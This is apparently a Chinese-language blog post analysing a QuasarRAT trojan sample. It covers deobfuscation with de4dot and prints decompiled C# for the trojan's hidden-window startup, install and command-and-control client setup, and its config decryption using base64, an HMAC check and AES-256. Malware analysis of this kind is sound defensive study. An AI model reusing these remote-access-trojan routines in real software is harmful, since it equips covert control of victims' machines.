---
title: QuasarRAT-2
date: 2026-04-23 15:56:15
categories:
  - 样本分析
tags:
  - 木马
  - QuasarRAT
---

![image-20260423155713827](https://cdn.jsdelivr.net/gh/availblemy/blog-img@main/img/image-20260423155713827.png)

来看这个木马比上个稍微难一点

![image-20260423160012069](https://cdn.jsdelivr.net/gh/availblemy/blog-img@main/img/image-20260423160012069.png)

可以看见这个代码中有大量的混淆先找到程序入口

![image-20260423160442461](https://cdn.jsdelivr.net/gh/availblemy/blog-img@main/img/image-20260423160442461.png)

可以看到有混淆的存在来分析是非常困难的于是我就去搜索有没有相关工具可以去混淆

de4dot就是一个去混淆的好工具

![image-20260423161244716](https://cdn.jsdelivr.net/gh/availblemy/blog-img@main/img/image-20260423161244716.png)

可以看见它生成了个clean文件

再打开看看

![image-20260423161437355](https://cdn.jsdelivr.net/gh/availblemy/blog-img@main/img/image-20260423161437355.png)

可以看见混淆清理的非常干净

 查看函数GForm0()

![image-20260423161635809](https://cdn.jsdelivr.net/gh/availblemy/blog-img@main/img/image-20260423161635809.png)

```c#
	protected override void OnLoad(EventArgs e)
	{
		base.Visible = false;
		base.ShowInTaskbar = false;
		this.method_1();
		base.OnLoad(e);
	}
```

其中method_1()是木马的主要逻辑

```c#
public void method_1()
	{
		if (!GClass65.smethod_0())
		{
			Environment.Exit(1);
		}
		this.gclass1_0 = new GClass1(GClass65.string_5);
		if (!this.gclass1_0.CreatedNew)
		{
			Environment.Exit(2);
		}
		Class19.smethod_4(Application.ExecutablePath);
		GClass5 gclass = new GClass5();
		if (this.IsInstallationRequired)
		{
			this.gclass1_0.Dispose();
			try
			{
				gclass.method_1();
				Environment.Exit(3);
				return;
			}
			catch (Exception)
			{
				return;
			}
		}
		try
		{
			gclass.method_0();
		}
		catch (Exception)
		{
		}
		if (!GClass65.bool_6)
		{
			this.method_0();
		}
		if (GClass65.bool_3)
		{
			this.gclass46_0 = new GClass46();
			this.gclass46_0.method_0();
		}
		Class27 @class = new Class27(new Class26().method_0(GClass65.string_1));
		this.gclass31_0 = new GClass31(@class, GClass65.x509Certificate2_0);
		this.gclass31_0.Event_1 += this.gclass31_0_ClientState;
		this.method_2(this.gclass31_0);
		this.gclass2_0 = new GClass2(this.gclass31_0);
		this.gclass2_0.method_1();
		new Thread(delegate
		{
			this.gclass31_0.method_15();
			Environment.Exit(0);
		}).Start();
	}
```

GClass65是这个木马的初始化

```c#
public static class GClass65
{
	// Token: 0x06000295 RID: 661 RVA: 0x00058284 File Offset: 0x00056484
	public static bool smethod_0()
	{
		if (string.IsNullOrEmpty(GClass65.string_0))
		{
			return false;
		}
		Class28 @class = new Class28(GClass65.string_7);
		GClass65.string_8 = @class.method_2(GClass65.string_8);
		GClass65.string_0 = @class.method_2(GClass65.string_0);
		GClass65.string_1 = @class.method_2(GClass65.string_1);
		GClass65.string_3 = @class.method_2(GClass65.string_3);
		GClass65.string_4 = @class.method_2(GClass65.string_4);
		GClass65.string_5 = @class.method_2(GClass65.string_5);
		GClass65.string_6 = @class.method_2(GClass65.string_6);
		GClass65.string_9 = @class.method_2(GClass65.string_9);
		GClass65.string_10 = @class.method_2(GClass65.string_10);
		GClass65.x509Certificate2_0 = new X509Certificate2(Convert.FromBase64String(@class.method_2(GClass65.string_11)));
		GClass65.smethod_1();
		return GClass65.smethod_2();

```

可以看到哪些关键数据是被method_2处理后在赋值

```c#
	public string method_2(string input)
	{
		return Encoding.UTF8.GetString(this.method_3(Convert.FromBase64String(input)));
	}
```

可以看到它先base64解码后再传给method_3

```c#
	public byte[] method_3(byte[] input)
	{
		if (input == null)
		{
			throw new ArgumentNullException("input can not be null.");
		}
		byte[] array6;
		using (MemoryStream memoryStream = new MemoryStream(input))
		{
			using (AesCryptoServiceProvider aesCryptoServiceProvider = new AesCryptoServiceProvider())
			{
				aesCryptoServiceProvider.KeySize = 256;
				aesCryptoServiceProvider.BlockSize = 128;
				aesCryptoServiceProvider.Mode = CipherMode.CBC;
				aesCryptoServiceProvider.Padding = PaddingMode.PKCS7;
				aesCryptoServiceProvider.Key = this.byte_0;
				using (HMACSHA256 hmacsha = new HMACSHA256(this.byte_1))
				{
					byte[] array = hmacsha.ComputeHash(memoryStream.ToArray(), 32, memoryStream.ToArray().Length - 32);
					byte[] array2 = new byte[32];
					memoryStream.Read(array2, 0, array2.Length);
					if (!Class29.smethod_0(array, array2))
					{
						throw new CryptographicException("Invalid message authentication code (MAC).");
					}
				}
				byte[] array3 = new byte[16];
				memoryStream.Read(array3, 0, 16);
				aesCryptoServiceProvider.IV = array3;
				using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aesCryptoServiceProvider.CreateDecryptor(), CryptoStreamMode.Read))
				{
					byte[] array4 = new byte[memoryStream.Length - 16L + 1L];
					byte[] array5 = new byte[cryptoStream.Read(array4, 0, array4.Length)];
					Buffer.BlockCopy(array4, 0, array5, 0, array5.Length);
					array6 = array5;
				}
			}
		}
		return array6;
	}
```

这里可以看见先是给256aes加密设置了一下然后验证了hash值

					if (!Class29.smethod_0(array, array2))
					{
						throw new CryptographicException("Invalid message authentication code (MAC).");
					}

这个对比了hash值来确保木马没有被篡改，最后再aes256解密
